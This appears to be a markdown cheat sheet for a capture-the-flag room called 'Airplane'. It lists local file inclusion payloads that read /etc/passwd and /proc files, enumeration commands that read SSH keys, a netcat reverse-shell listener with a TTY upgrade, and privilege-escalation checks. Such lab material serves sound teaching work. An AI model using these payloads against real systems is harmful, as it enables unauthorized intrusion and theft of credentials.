# 💣 Airplane — Payload Reference Guide

> Payloads used for enumeration and exploitation during the Airplane room.

⚠️ Educational use only within authorized labs.

---

# Local File Inclusion Payloads

## Basic Traversal

```text
?page=../../../../../../../etc/passwd
```

Purpose:

* Verify LFI.
* Enumerate Linux users.

---

## Group Enumeration

```text
?page=../../../../../../../etc/group
```

Purpose:

* Enumerate privileged groups.
* Identify sudo users.

---

## Environment Enumeration

```text
?page=../../../../../../../proc/self/environ
```

Purpose:

* Identify running web process user.
* Inspect runtime environment.

---

## TCP Socket Enumeration

```text
?page=../../../../../../../proc/net/tcp
```

Purpose:

* Enumerate hidden listening services.
* Discover internal ports.

---

# Useful Linux Enumeration Commands

## Current Identity

```bash
whoami
id
groups
```

---

## Host Information

```bash
hostname
uname -a
cat /etc/os-release
```

---

## SUID Enumeration

```bash
find / -perm -4000 -type f 2>/dev/null
```

Purpose:

Identify binaries running with elevated permissions.

---

## SSH Enumeration

```bash
ls -la ~/.ssh
cat ~/.ssh/authorized_keys
```

---

# Reverse Shell Preparation

## Listener

```bash
nc -lvnp 4444
```

---

## TTY Upgrade

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

---

## Environment Fix

```bash
export TERM=xterm
stty rows 40 columns 120
```

---

# Searchsploit Workflow

```bash
searchsploit gdbserver
```

Purpose:

Research publicly documented exploits.

---

# SSH Key Workflow

## Generate Key Pair

```bash
ssh-keygen
```

## Authenticate

```bash
ssh -i id_rsa USER@TARGET
```

---

# Privilege Escalation Checklist

| Enumeration Area | Command              |
| ---------------- | -------------------- |
| SUID             | `find / -perm -4000` |
| sudo             | `sudo -l`            |
| Capabilities     | `getcap -r /`        |
| Writable Files   | `find / -writable`   |

---

# Notes

This repository intentionally excludes:

* Challenge flags.
* Spoiler payload outputs.
* Unauthorized exploit automation.
